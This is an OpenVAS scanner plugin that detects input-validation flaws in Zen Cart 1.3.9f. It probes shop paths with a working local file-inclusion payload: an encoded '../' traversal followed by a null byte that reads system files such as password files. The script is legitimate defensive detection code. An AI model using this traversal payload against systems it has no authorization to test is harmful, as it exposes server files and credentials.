###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zen_cart_43628.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# Zen Cart Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100840");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-10-04 14:08:22 +0200 (Mon, 04 Oct 2010)");
  script_bugtraq_id(43628);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("Zen Cart Multiple Input Validation Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/43628");
  script_xref(name:"URL", value:"http://www.zen-cart.com/");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4967.php");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4966.php");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Updates are available. Please see the reference for more details.");
  script_tag(name:"summary", value:"Zen Cart is prone to multiple input-validation vulnerabilities because
it fails to adequately sanitize user-supplied input. These
vulnerabilities include local file-include, SQL-injection, and HTML-
injection issues.

Exploiting these issues can allow attacker-supplied HTML and script
code to run in the context of the affected browser, allowing attackers
to steal cookie-based authentication credentials, view local files
within the context of the webserver, compromise the application,
access or modify data, or exploit latent vulnerabilities in the
underlying database. Other attacks may also be possible.

Zen Cart v1.3.9f is vulnerable, other versions may also be affected.");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/shop", "/cart", "/zen-cart", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir, "/index.php?typefilter=",crap(data:"..%2f",length:9*5),files[file],"%00");

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
